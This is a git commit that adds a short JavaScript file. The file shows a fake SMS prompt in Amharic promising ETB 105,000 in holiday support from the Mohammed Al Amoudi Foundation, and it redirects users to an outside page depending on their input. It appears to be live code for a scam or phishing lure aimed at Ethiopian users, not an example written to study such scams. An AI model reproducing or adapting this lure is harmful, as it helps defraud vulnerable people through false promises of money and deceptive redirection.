8d12e8bf4d8169568f7307d0334d053bb9faf804
bigukpe <bigaka42@gmail.com>
2025-05-28 20:35:35 +0100

    Create ethio-activation.js

---
+++ ethio-activation.js
@@ -0,0 +1,5 @@
+var password = 'ETB105,000 ማውጣት'
+password=prompt('SMS: እንኳን ደስ አለህ ከመሀመድ አል አሙዲ ፋውንዴሽን የ105,000 የብሄራዊ ቀን በዓል አከባበር ድጋፍ ለመቀበል ከተመረጡት መካከል ናችሁ እና ገንዘብ ለማውጣት እሺን ጠቅ ያድርጉ።','ETB105,000 ማውጣት');
+if (password != 'ETB105,000 ማውጣት') {
+location.href='https://learnlivetech.org/ethio-national.html';
+}
